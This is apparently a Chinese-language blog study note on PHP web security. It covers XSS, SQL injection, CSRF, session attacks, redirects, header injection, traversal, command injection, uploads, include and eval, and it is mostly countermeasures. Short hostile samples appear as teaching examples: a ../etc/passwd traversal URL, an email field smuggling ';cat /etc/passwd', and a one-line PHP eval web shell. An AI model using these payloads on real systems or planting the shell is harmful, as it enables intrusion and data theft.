| ----------------------- | -------------------------- | ----------------------------------------- |
| `<`  `>`  `'`  `"`  `\` | `<`  `>`  `\'`  `\"`  `\\` | `&lt;`  `&gt;`  `\&#39;`  `\&quot;`  `\\` |

> 或直接使用Unicode转义, 将字母数字之外的字符转为Unicode

### 错误报告导致信息泄露

错误信息泄露存在以下两种状况:

- 错误信息中含有对攻击者有帮助的应用程序内部信息
- 通过蓄意攻击使错误信息中显示隐私信息(如用户名/密码等)

PHP可以配置关闭错误显示

```properties
# php.ini
display_errors = Off
```

## 页面显示相关问题解决方案

### XSS分类

XSS主要分为**反射型XSS**和**存储型XSS** 

- 反射型XSS(Reflected XSS)

  攻击用的JS代码位于攻击目标网站之外的其他网站(恶意网站或邮件中的URL)

  如窃取Cookie中使用的用户输入值确认页面

  ![image-20220908173455951](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/98982edad9d258e8a6a9b88101f2f50f-b9b1923.png)

- 存储型XSS (Stored XSS)

  也叫持久性XSS(Presistent XSS), 攻击用JS代码保存在攻击对象服务器上

  典型攻击对象为Web邮箱客户端及社交网站发布页

  ![image-20220908173536032](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1918ea18397b8b65c234a533029a1caf-d661208.png)

### XSS产生根源

根本原因是在生产HTML过程中, HTML语法中的关键字(元字符)没有被正确处理, 导致HTML/JS被注入, 从而导致原有页面结构变化.

为了消除关键字的特殊意义, 将其转化为普通字符, 就需要进行转义/实体化处理

```
转义规则: http://www.w3chtml.com/html/character.html
```

### 解决方案

参数所在位置转义方式:

| 位置                 | 说明                                             | 最低限度转义内容                    |
| -------------------- | ------------------------------------------------ | ----------------------------------- |
| 元素内容             | 1.能解释Tag和字符实体<br />2.结束边界字符为 `<`  | `<`  `&`                            |
| 属性值               | 1.能解释字符实体<br />2.结束边界字符为双引号 `"` | 属性值用双引号括起来, `<`  `&`  `"` |
| 属性值(URL)          | 同上                                             | 校验URL格式正确后按属性值规则转义   |
| 事件绑定函数         | 同上                                             | 转义JavaScript后按属性值规则转义    |
| Script元素中的字符串 | 不能解释Tag和字符实体<br />结束边界字符为`</`    | 转义JavaScript并避免出现 `</`       |

- PHP中一般使用 `htmlspecialchars($string, $quote_style, $charset)` 函数进行实体化转义, 如:

    ```php
    echo htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    ```
    
- 输入校验, 通过校验用户输入值的有效性, 防御XSS攻击

- 给Cookie添加`HttpOnly`属性, 禁止 JavaScript 读取Cookie信息

    ```properties
    # php.ini
    session.cookie_httponly = 1
    ```

## SQL调用相关问题

### SQL注入

SQL注入漏洞是由于SQL语句的调用方法不完善而产生的安全隐患. 导致的结果一般是直接对服务器的攻击, 而不需要用户的参与, 可能造成以下影响:

- 数据库信息被窃取
- 数据库内容被篡改
- 登陆认证失效
- 其他如, 服务器文件被读取/修改, 服务器程序执行

| 对象         | 结果                                       |
| ------------ | ------------------------------------------ |
| 产生地点     | 调用SQL语句的地方                          |
| 影响范围     | 所有页面                                   |
| 影响类型     | 信息泄露、篡改数据、绕过认证、浏览编辑文件 |
| 影响程度     | 大                                         |
| 用户参与程度 | 不需要                                     |
| 对策概要     | 使用静态占位符, 预编译模式运行SQL          |

SQL注入攻击方式多种多样 , 暂不具体展开, 后续开专题详细介绍, 应对方式一般使用静态占位符预编译即可

```php
$sql = "select * from tb_user where name = ? and pwd = ? limit 1";
$pdo_stmt = $mysql->prepare($sql);
$pdo_stmt->execute($dataArray);
$result = $pdo_stmt->fetchAll();
```

 **其他辅助对策**:

- 不显示详细错误信息 
- 校验输入值有效性
- 设置数据库权限

## 关键处理中引入的安全隐患-CSRF

关键处理中如果存在安全隐患, 可能产生跨站请求伪造(CSRF)的漏洞

> 关键处理  - 账号转账/发送邮件/密码更改 等一旦完成无法撤销的操作
>
> CSRF  -   跨站请求伪造Cross-Site Request Forgery

执行关键处理前, 需要确认请求确实是用户自愿发起的. 如果存在CSRF漏洞, 可能造成:

- 攻击者使用用户的账号 下单购物/发帖
- 攻击者删除用户账号
- 攻击者更改用户的密码/邮箱

| 对象         | 结果                                                         |
| ------------ | ------------------------------------------------------------ |
| 产生地点     | 以下任意网站上执行关键处理的页面:<br />- 仅使用Cookie进行会话处理的网站<br />- 仅依靠HTTP认证、SSL证书、手机移动ID标识用户的网站 |
| 影响范围     | 存在CSRF漏洞的页面                                           |
| 影响类型     | 以用户权限执行关键处理                                       |
| 影响程度     | 中 ~ 大                                                      |
| 用户参与程度 | 需要 -> 点击恶意链接、浏览恶意网站                           |
| 对策概要     | 执行关键处理前, 确认是正规用户发起请求                       |

### 典型攻击模式

- 1.目标页面

  ![image-20220909112236956](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e83386364b6d0c26fe9c4214ee39c687-2d6293d.png)

  ![image-20220909112353922](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5118161300b4a391b533193c1bccdab5-61b4e6f.png)

  整个页面工作流程为: 

  - 确认用户登陆状态, 显示修改密码链接
  - 用户输入新密码, 通过POST将信息传入后台处理脚本
  - 后台接收数据, 修改当前用户密码并回显

- 2.构建钓鱼页面, 诱使用户点击

  ![image-20220909112735590](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c2e47deac0e92cbcb8e8871d901fca62-9e3ee52.png)

  ![image-20220909112934443](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4b58b688040bbd7cb0da4c8ed422bb4c-7adf890.png)

- 3.攻击流程

  ![image-20220909113243497](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f0a5d4d6507941ee1ba6e1ff843bc96c-e833054.png)

  根据同源策略, iframe外层(恶意网页) 无法读取到内部(目标网页) 的内容, 因此, CSRF攻击无法获取目标的内容, 但可以模拟用户操作, 使用当前用户的Cookie修改用户密码, 从而达到攻击目标

### 解决方案

防御CSRF关键为 确认关键处理的请求确实是来自正规用户自愿发起的. 因此需要执行以下两点:

- 筛选需要防范CSRF攻击的页面(关键处理页面)
- 使代码能判断当前操作是否为用户主观行为

**确认正规用户自愿发起请求方式**:

![image-20220909113900268](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7108dd61f870ad1561862b1699c67401-c636235.png)

- 嵌入机密信息(令牌)

  ```php
  # 关键页面
  <input type="hidden" name="token" value="<?php echo htmlspecialchars(session_id) ?>">
  
  # 后台处理
  if (session_id() !== $_POST['token']) die('请从正规页面操作');
  ```

- 再次输入密码

  发送确认短信/输入密码, 确保是用户自愿发起, 但需要保证确认密码页面是最后的执行页面, 否则可能被跳过

- 检验Referer

  ```php
  if ($_SERVER['HTTP_REFERER'] !== WEB_HOST) die('REFERER检测失败');
  ```

**防范策略比较** 

|              | 嵌入令牌                   | 确认密码                   | 确认REFERER             |
| ------------ | -------------------------- | -------------------------- | ----------------------- |
| 开发耗时     | 中                         | 中                         | 小                      |
| 用户影响     | 无                         | 增加输入密码步骤           | 关闭Referer用户无法使用 |
| 手机网站适用 | 可以                       | 可以                       | 不可以                  |
| 建议使用位置 | 基本策略, 所有情况均可适用 | 防范他人伪装需求较强的页面 | 可以限定用户环境        |

### 辅助性对策

执行关键处理后, 可以向用户注册邮箱发送相关处理内容的通知, 让用户第一时间知情, 降低损害



![image-20220907102354779](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/328a63fa24f412a96b28b834b403439a-5a51513.png)

![image-20220907103556039](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b2afb282f2858018f2b14df3039376f8-88adc0d.png)

![image-20220907105331970](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e34eb616c1d76ff51216bce014492c01-de36d7a.png)



方式:

![image-20220907111639726](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/eb62cbdb2cbcc7351eb9f5295f853ad4-c050011.png)

检查Referer

![image-20220907111539038](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/07b0207e96cdca12ab1fa484c79b5dbb-0c30532.png)

嵌入机密令牌(Token )

![image-20220907110830638](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/307a2ad70df94ae2f31ccddf3e6e993b-d54d5c6.png)

再次输入密码/短信确认信息

(密码确认需要在最后一个执行确认节点, 否则还是存在CSRF漏洞)

辅助对策: 执行关键处理后, 向注册邮箱发送通知

## 不完善的会话管理

Web应用中经常使用会话管理机制来记忆认证结果等状态. 一般使用**Cookie**记忆当前**会话ID**, 因此, 会话ID的作用相当于获取服务器端信息的钥匙

如果由于某些原因, 用户的会话ID被第三方得知, 就会出现他人伪装用户访问的风险, 这种攻击手段就称为**会话劫持**

### 第三方获取会话ID方式

- 预测 会话ID
- 窃取 会话ID
- 挟持 会话ID

![image-20220907113217019](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/40db245eb8a5306c5cf9a36661a4b498-0bbf153.png)

#### 预测会话ID

如果生成会话ID的方式不妥善, 可能会被第三方预测成功, 如连续的数值, 基于日期、用户名生成, 开源软件中可预测的生成代码逻辑等

#### 窃取会话ID

窃取会话ID方式有以下几种:

- 生成时Cookie属性设置不妥善(httponly)

- 明文传输, 被网络监听

- 由于跨站脚本安全隐患泄露

- PHP或浏览器平台安全隐患泄露

- 会话ID在URL中使用, 经由Referer泄露(支持发布外链)

可能导致安全隐患:

- 跨站脚本攻击(XSS)
- HTTP消息头注入
- 嵌入在URL中的会话ID

#### 劫持会话ID

将**会话ID**强制设置到用户浏览器中, 也就相当于攻击者得知了用户的会话ID, 称为 **会话固定攻击**(Session Fixation Attack)

### 安全隐患

#### 会话ID可预测

| 对象         | 结果                                                     |
| ------------ | -------------------------------------------------------- |
| 产生地点     | 生成会话ID的地方                                         |
| 影响范围     | Web应用使用会话管理的所有页面                            |
| 影响类型     | 伪装用户                                                 |
| 影响程度     | 大                                                       |
| 用户参与程度 | 不需要                                                   |
| 对策概要     | 停止自己实现会话管理机制, 而使用平台或语言提供的会话机制 |

**攻击步骤**:

- 1.收集对象应用的会话ID
- 推测会话ID生成规则
- 在对象应用中实验生成的会话ID

**常见会话ID生成方式**:

会话ID一般都是基于以下内容生成:

- 用户ID或邮箱地址

- 远程IP地址

- 日期与实践(UNIX时间戳或年月日时分秒字符串)

- 随机数

![image-20220909121157721](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a669e5ba0cdd20ed1a9ef61c58f80536-7d6b5a0.png)

**对策**:

为了避免生成可预测的会话ID产生安全隐患, 应当停止自己实现会话管理机制, 而使用平台或语言提供的会话机制

#### 会话ID嵌入URL

会话ID有时并不保存在Cookie中, 而是被保存于URL. 由于一些手机浏览器不支持Cookie, 因此这种做法也经常使用

```
http://example.com/login.php?PHPSESSID=onjic14un02ccjqilsq8uq8as0
```

会话ID嵌入URL可能导致会话ID经由Referer外协, 从而造成伪装攻击

| 对象         | 结果                              |
| ------------ | --------------------------------- |
| 产生地点     | 生成会话ID的地方                  |
| 影响范围     | Web应用使用会话管理的所有页面     |
| 影响类型     | 伪装用户                          |
| 影响程度     | 中 ~ 大                           |
| 用户参与程度 | 需要 -> 点击链接, 浏览邮件附属URL |
| 对策概要     | 在程序中设置禁止嵌入会话ID到URL   |

**PHP会话设置**

```properties
# php.ini
## 使用Cookie保存会话ID, 默认On(1)
session.use_cookies = 1	  
## 仅将会话ID保存在Cookie, 默认On(1)
session.use_only_cookies = 1
## 自动将会话ID嵌入URL, 默认Off(0)
session.use_trans_sid = 0
```

配置使用效果

| use_cookies | use_only_cookies | 会话ID保存位置                                   |
| ----------- | ---------------- | ------------------------------------------------ |
| On          | On               | 会话ID仅保存在Cookie中                           |
| On          | Off              | 可以使用Cookie时保存在Cookie中,不能使用时嵌入URL |
| Off         | On               | 无意义组合                                       |
| Off         | Off              | 始终将会话ID嵌入URL                              |

> 上述情况中, `session.use_trans_sid`值为`On`时, 会话ID会自动嵌入URL, `Off`时, 仅在需要嵌入时, 才会嵌入

**攻击案例**

```properties
# php.ini
session.use_cookies = 0	  
session.use_only_cookies = 0
session.use_trans_sid = 1
```

构建钓鱼页面, 诱使用户点击

![image-20220909163655413](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2b8ab5ee31afaa29daf9c8c1a74f4207-bb9d70b.png)

![image-20220909163754243](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c36eafce4a03d2075ef093ed3898ae68-b5a86ae.png)



**攻击条件**

网站同时满足以下两个条件是, 存在会话ID失窃的风险

- 能够使用被嵌入URL的会话ID
- 存在跳转至外部网站的链接. 或用户可以发布自己的链接

**对策**

PHP设置仅使用Cookie保存会话ID, 不开启嵌入URL配置, 即默认配置

#### 固定会话ID

会话攻击的另一种手段为从外部劫持会话ID, 即会话固定攻击. 攻击流程如下:

- 1.取得目标网站的会话ID或自己指定ID
- 2.强行将上述会话ID交给用户
- 3.用户登陆目标Web应用
- 4.攻击者使用该会话ID伪装用户进入Web应用

> 应对会话固定攻击时, 彻底杜绝步骤2比较困难, 因此一般采用用户登陆时更换其会话ID的方式

| 对象         | 结果                              |
| ------------ | --------------------------------- |
| 产生地点     | 进行登陆处理的页面                |
| 影响范围     | Web应用使用会话管理的所有页面     |
| 影响类型     | 伪装用户                          |
| 影响程度     | 中 ~ 大                           |
| 用户参与程度 | 需要 -> 点击链接, 浏览邮件附属URL |
| 对策概要     | 用户登陆时更换会话ID              |

**攻击案例**

```properties
# php.ini
session.use_cookies = 1 
session.use_only_cookies = 0
session.use_trans_sid = 1
```

- 1.目标页面, 登陆

  ![image-20220909170628330](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b029b662b01229f0d4a3e1d58e7e8921-52f46f7.png)

  ![image-20220909170746289](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c6eb98a75be2fef804edcc6b72faa0c3-360995f.png)

- 构建钓鱼链接, 诱使用户点击登陆

  ![image-20220909170828538](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/406bdbd2f8cdff7b0e0209bb84556f25-52c8aac.png)

  ![image-20220909171110803](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3926a67c19a11654e615926244a565fe-f5e8eee.png)

**对策**

由于框架/平台存在**会话采纳(Session Adoption)**机制, 会采用预先提供的会话ID来生成会话. 存在以下对策:

- **方案一 认证登陆后更改会话ID**

  PHP中可以使用函数 `session_regenerate_id()` , 当指定参数为`ture`时, 会自动生成新的会话ID. 格式如下:

  ```php
  bool session_regenerate_id([bool $delete_old_session = false])
  ```

  ![image-20220909172001418](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0acb6220fb22e8ebac9c46a6a2ccf255-eebd6c2.png)

- **方案二 采用令牌**

  登陆/注册时, 生成一个随机字符串(令牌), 将其同时保存在Cookie和会话变量中. 然后在各页面确认比较Cookie和令牌值, 如果两者一致则视为认证成功, 不一致时认证失败.

  由于只有在登陆时令牌才发布, 攻击者不经过登陆页, 无法获取令牌值, 可以成功防御会话固定攻击

  ![image-20220909175701763](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7f04c67dec6e85b43c60d0785faba5eb-2e65b65.png)

**辅助对策**

如果登陆前使用了会话变量, 防范会话固定攻击比较难. 在这种状况下, 也可以使用hidden参数来传递值, 或与以下方式组合使用:

- 不再登陆前的会话变量中存储敏感数据
- 不使用嵌入URL的会话ID



## 重定向相关

Web应用中有时会重定向到外界指定的URL. 典型案例为: 在登陆页面参数中指定URL, 登陆成功后重定向到该URL.

```
https://www.google.com/accounts/ServiceLogin?continue=https://mail.google.com/mail
```

重定向处理时可能产生以下安全风险:

- 自由重定向漏洞
- HTTP消息头注入

### 自由重定向

有些Web应用提供了能够重定向到参数指定URL的功能, 即**重定向器(Redirector)**, 其中能够重定向到任意域名的重定向器叫**自由重定向(Open Redirect)**. 自由重定向可能导致用户在不知情状况下被带入其他网站, 从而遭受钓鱼攻击

| 对象         | 结果                              |
| ------------ | --------------------------------- |
| 产生地点     | 能够重定向到外界指定URL的页面     |
| 影响范围     | Web应用的所有页面                 |
| 影响类型     | 诱导用户到钓鱼网站, 暴露重要信息  |
| 影响程度     | 中 ~ 大                           |
| 用户参与程度 | 需要 -> 点击链接, 浏览邮件附属URL |
| 对策概要     | 固定重定向目标 或 白名单机制      |

> 应该评估 [自由重定向功能] 是否不可或缺, 并固定重定向目标. 实在无法固定, 可限制在运行域名范围内

**攻击案例** 

- 1.目标页面, 正常登陆流程

  ![image-20220909205057240](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/90f284a4a143655a75824ffcda1426ce-a74d589.png)

  ![image-20220909205240730](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ade751cbcf447f63c21270d6a920be3c-96c7cce.png)

- 2.构建钓鱼页面, 诱使用户点击

  ![image-20220909205436417](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e51c4e3c1cda51b2eb0057a4851c62d8-4257e93.png)

  ![image-20220909205806398](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/345583de1e1b940626cbd79228497524-a336fb5.png)

自由重定向漏洞产生的原因主要是:

1.重定向目标可以由外界指定

2.没有对重定向目标域名做校验

**对策** 

- 固定重定向的目标URL
- 使用编号指定重定向目标URL
- 校验重定向目标域名

### HTTP消息头注入

HTTP消息头注入漏洞是指, 在重定向或生成Cookie等基于外部传入的参数输出HTTP响应头时查收的安全隐患. 输出响应消息头时, 通过在参数中添加换行符, 就可以实现任意添加响应消息头或伪造消息体的操作

可能造成以下影响:

- 生成任意Cookie

- 重定向至任意URL

- 更改页面显示内容

- 执行任意JS代码而造成XSS同样的损害

  

响应头中的换行符有特殊意义, 一个换行符代表一条属性的结束, 两个换行符代表消息头结束, 消息体开始

![image-20220909212221572](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ea61602f148ba8dbd93405f0e4f3b43e-5f92ef0.png)

**请求报文格式**:

![image-20220909210941145](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e7c1d15011079f938d9de11fbc29be1d-c06feaa.png)

**响应报文格式**:

![image-20220909211106387](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/05d7d0454e0ea2c56e8673df629d2c12-e82ed0e.png)

| 对象         | 结果                                                         |
| ------------ | ------------------------------------------------------------ |
| 产生地点     | 重定向或生成Cookie等基于外部传入的参数输出HTTP响应头的页面   |
| 影响范围     | Web应用的所有页面                                            |
| 影响类型     | 伪装、显示伪造页面、缓存污染                                 |
| 影响程度     | 中 ~ 大                                                      |
| 用户参与程度 | 需要 -> 点击链接, 浏览邮件附属URL                            |
| 对策概要     | 不将外界传入参数作为HTTP响应头输出 或 校验重定向/生成Cookie参数中的换行符 |

**安全隐患产生原因**

HTTP响应头信息能够以文本格式逐行定义, 也就是说消息头之间以换行符分隔. 如果攻击者指定重定向目标URL或Cookie值参数中插入换行符, 且该换行符直接被作为响应输出, 就会产生HTTP消息头注入

**对策**

- **对策一** 不将外界参数作为HTTP响应消息头输出

  - 不直接使用URL, 而是从外界获取URL编号, 对应匹配后指定URL
  - 使用Web服务中的会话变量来移交URL

- **对策二** 校验消息头参数

  - 由专门的API进行重定向或生成Cookie

    ```php
    header('location:' . $URL);
    setcookie();
    ```

  - 校验生成消息头参数中的换行符

## cookie输出相关

### 用途不当

不应使用Cookie保存敏感数据, 或过于依赖Cookie中的数据. 因为Cookie是保存在客户端且可以被修改的

![image-20220909213435904](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9e28a8d7ecfe3ceca5132f5821b2b7d4-55bd73a.png)

> 除了控制消息有效期限和不同服务器件共享信息, 除此之外, 会话变量均优于使用Cookie

### 输出方法不当

输出Cookie时容易产生安全隐患:

- HTTP消息头注入

- Cookie安全属性设置不完善

  ![image-20220909213416045](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ec14bc38e01a1c3e071897ef418506df-1c0e51c.png)

  Cookie中包含Secure属性, 指定时仅在HTTPS传输下才会被浏览器发送至服务器. 而如果未指定安全属性, 即使应用中使用了HTTPS传输, Cookie也可能会以明文方式传输,  存在监听风险

  为解决这一问题, 最直接的对策是使用Cookie的安全属性. 如果网站中HTTP和HTTPS同时存在,  可以通过添加一个设置安全属性的令牌Cookie, 在每个HTTPS页面中确认令牌值即可

**对策**

- **方案一** 设置Secure属性

  ```properties
  # php.ini
  session.cookie_secure = 1
  session.cookie_httponly = 1
  ```

- **方案二** 使用令牌Token

  ```php
  $token = $_COOKIE['token'];
  if (!$token || $token != $_SESSION['token']) die('Token 验证失败');
  ```

## 文件处理相关

在有些Web应用中, 可以通过外接传入参数的方式来指定服务器中的文件名, 如指定模板. 可能造成以下风险

- 目录遍历  非法访问服务器文件
- OS命令注入  调用OS命令

### 目录遍历漏洞

Web应用允许外界以参数形式指定服务器文件名时, 如果没有进行充分校验, 可能造成文件被浏览、篡改或删除. 

可能造成以下**影响**:

- 浏览Web服务器中的文件
  - 泄露重要信息
- 篡改/删除服务器文件
  - 篡改网页文件内容
  - 删除脚本文件或配置文件导致宕机
  - 通过篡改脚本文件在服务器上执行任意脚本

要**防范**目录遍历漏洞, 有如下方式(多选一):

- 避免由外界指定文件名
- 文件名中不允许包含目录
- 限定文件名中仅包含数字和字母

| 对象         | 结果                                                         |
| ------------ | ------------------------------------------------------------ |
| 产生地点     | 允许外界以参数形式指定服务器文件名的页面                     |
| 影响范围     | Web应用的所有页面                                            |
| 影响类型     | 泄露隐私信息、篡改删除信息、执行脚本、宕机                   |
| 影响程度     | 大                                                           |
| 用户参与程度 | 不需要                                                       |
| 对策概要     | - 避免由外界指定文件名 <br />- 文件名中不允许包含目录 <br />- 限定文件名中仅包含数字和字母 |

**攻击案例**

- 1.目标页面

  ![image-20220910103711569](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9f22cd09732fb15d8c36279ccc5a38d2-63712fe.png)

- 2.请求参数变更

  ```
  http://local2.project.com/?tpl=../../../../etc/passwd
  ```

  ![image-20220910103756231](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b707e8b80910f90b56c78bbb381868d6-da8b2bd.png)

**对策**

实施以下任一项:

- 避免由外界指定文件名

  - 固定文件名
  - 将文件名保存在会话变量中
  - 不直接指定文件名, 而是使用编号的间接指定

- 文件名中不允许包含目录

  - ```php
    $tpl = basename($_GET['tpl']);
    ```

- 限定文件名中仅包含数字和字母

  - ```php
    if (!preg_match('/\A[a-z0-9]+\.html\z/ui', $tpl)){
        die('tpl仅能使用数字和字母');
    }
    ```

### 内部文件被公开

Web服务器中的公开目录有时会防止对外保密的文件. 外界一旦得知文件URL, 就能浏览内部文件, 所以, 一般不在公开目录中放置内部文件, 或直接禁用目录列表功能

| 对象         | 结果                                               |
| ------------ | -------------------------------------------------- |
| 产生地点     | 网站全体                                           |
| 影响范围     | 仅限于被公开文件                                   |
| 影响类型     | 泄露隐私信息                                       |
| 影响程度     | 大                                                 |
| 用户参与程度 | 不需要                                             |
| 对策概要     | 不在公开目录中放置内部文件, 或直接禁用目录列表功能 |

![image-20220910104559023](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8d69192c8659a05f764663bbee36d5a3-a50b9d8.png)

```
# Apache中编辑httpd.conf禁用目录列表
<VirtualHost *:80>
  ServerName ni9ne.com.cn
  DocumentRoot "D:/wamp64/www/test/WebSecure/web"
  <Directory  "D:/wamp64/www/test/WebSecure/web/">
    Options +Includes +FollowSymLinks +MultiViews # 去除[+Indexes]配置
    AllowOverride All
    Require all granted
  </Directory>
</VirtualHost>
```

## 调用OS命令相关问题

Web开发中, 大部分语言都支持通过shell执行OS(操作系统)命令. 当编码时通过shell执行OS命令或某个方法内部使用shell. 就可能出现OS命令被任意执行的情况, 即**OS命令注入**

### OS命令注入

- 1.目标页面 发送邮件

  ![image-20220910121843511](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3e5962f26bed8d553ec9f17d6cafe24c-a12ac4f.png)

  ![image-20220910121913823](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9ffefa6eb6c260615b3202617cfebb36-8757277.png)

- 2.输入注入命令

  ```
  ni9ne@outlook.com;cat /etc/passwd
  ```

  ![image-20220910122023301](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bbbd0b8d784c15b58a0f80955acfbc96-fbe6d36.png)

  

**OS注入产生原因** 

使用Shell来启动命令, 同时也意味着可以使用连续命令, 管道符, 重定向等功能

```
# php 执行代码
system("echo hello > a.txt");
# 相当于Shell执行
sh -C echo hello > a.txt
```

如果指定OS命令参数字符串中混入了Shell的元字符, 就会导致攻击者添加的OS命令被执行. 即满足OS注入漏洞的条件包括:

- 使用了内部调用Shell的函数 (system open等)
- 将外界传入参数传递给内部调用Shell的函数
- 参数中Shell的元字符没有被转义

**对策**

为了防范OS命令注入, 可以使用以下方法:

- 选择不调用OS命令的实现方法

  ```php
  mb_send_mail($to, $content, 'From: xxx@qq.com');
  ```

- 不将外界输入的字符串传递给命令行参数

  不将字符传放入命令, 而是通过指定消息头的方式, 由命令自行读取参数

- 使用安全的函数对参数进行转义

  ```php
  escapeshellarg();
  ```

## 文件上传问题

### 针对上传的DOS攻击

使用上传功能连续发送体积巨大的文件, 可能形成网站负荷过载的**DOS攻击**(Denial of service Attack)

防范DOS攻击的一种有效策略为限制上传文件的容量. 

PHP中的php.ini文件限制:

| 设置项目            | 说明                     | 默认值 |
| ------------------- | ------------------------ | ------ |
| file_uploads        | 是否允许使用文件上传     | On     |
| upload_max_filesize | 单个文件最大容量         | 2MB    |
| max_file_uploads    | 单次请求最大文件上传个数 | 20     |
| post_max_size       | POST包最大限制           | 8MB    |
| memory_limit        | 脚本最大申请内存         | 128MB  |

>  Apache/Nginx中也有类似的配置项目

### 上传执行脚本

有些文件上传处理会将用户上传的文件保存至Web服务器的公开目录中. 如果上传了php、asp、aspx、jsp等脚本文件, 用户就可以在服务器上执行脚本, 造成与OS命令注入同样的影响

为了防范上传脚本, 可以使用以下方法:

- 不将用户上传的文件保存在公开目录中, 浏览文件需要通过脚本实现
- 将文件的扩展名限定为不可执行的文件

| 对象         | 结果                                                         |
| :----------- | ------------------------------------------------------------ |
| 产生地点     | 提供文件上传的页面                                           |
| 影响范围     | 所有页面                                                     |
| 影响类型     | 泄露隐私信息、篡改删除数据、对外发动DOS攻击的                |
| 影响程度     | 大                                                           |
| 用户参与程度 | 不需要                                                       |
| 对策概要     | - 不将用户上传的文件保存在公开目录中, 浏览文件需要通过脚本实现 <br />- 将文件的扩展名限定为不可执行的脚本文件 |

**恶意脚本**

```php
@eval($_POST['shell']);
```

**对策**

- 校验上传文件类型

  ```php
  # 匹配后缀
  $allowType = ['jpg', 'gif', 'png'];
  $allowHeader = [];
  $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
  if (!in_array($extension, $allowType)){
      die('文件格式不允许上传');
  }
  # 匹配字节头
  $allowHeader = [IMAGETYPE_GIF, IMAGETYPE_JPEG, IMAGETYPE_PNG];
  $type = getimagesize($filename)[2];
  if (!in_array($type, $allowHeader)){
      die('文件格式不允许上传');
  }
  ```

### 诱使用户下载恶意文件

## include相关问题

PHP等脚本语言能够从外部文件读取脚本源代码的一部分. 对应的关键字包括 

```php
require ;  require_once ; include ; include_once ;
```

如果外界能够制定include的对象文件名, 就可能造成意料之外的文件被include而遭受攻击. 即文件包含漏洞. 在PHP的配置中, 还能开启配置, 可以指定外部服务器的URL作为包含文件, 可能存在远程文件包含风险(RFI)

```properties
# php.ini
allow_url_include = Off
```

为了防范文件包含漏洞, 可以采取以下措施:

- 避免include的路径中包含外界传入的参数
- include路径包含参数时, 限制字符种类仅为数字和字母

| 对象         | 结果                                                         |
| :----------- | ------------------------------------------------------------ |
| 产生地点     | include读取脚本的页面                                        |
| 影响范围     | 所有页面                                                     |
| 影响类型     | 泄露隐私信息、篡改删除数据、对外发动DOS攻击的                |
| 影响程度     | 大                                                           |
| 用户参与程度 | 不需要                                                       |
| 对策概要     | - 避免include的路径中包含外界传入的参数<br />- include路径包含参数时, 限制字符种类仅为数字和字母 |

## eval相关问题

如果eval 函数使用不当, 可能导致外界传入脚本被执行, 即**eval注入攻击** 

为避免出现风险, 可采取以下措施:

- 不使用eval或eval相当的功能
- 避免eval的参数包含外界传入的参数
- eval参数中包含外界传入参数时, 校验参数, 限定为仅含数字字母 

| 对象         | 结果                                                         |
| :----------- | ------------------------------------------------------------ |
| 产生地点     | 使用eval或eval相当的功能的页面                               |
| 影响范围     | 所有页面                                                     |
| 影响类型     | 泄露隐私信息、篡改删除数据、对外发动DOS攻击的                |
| 影响程度     | 大                                                           |
| 用户参与程度 | 不需要                                                       |
| 对策概要     | - 不使用eval或eval相当的功能<br />- 避免eval的参数包含外界传入的参数<br />- eval参数中包含外界传入参数时, 限定为仅含数字字母 |









## 发送邮件问题

```
# Apache中编辑httpd.conf
  <Directory  "D:/wamp64/www/test/WebSecure/web/">
    Options +Includes +FollowSymLinks +MultiViews # 去掉+Indexes配置
    AllowOverride All
    Require all granted
  </Directory>
```

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>项目</tag>
      </tags>
  </entry>
</search>
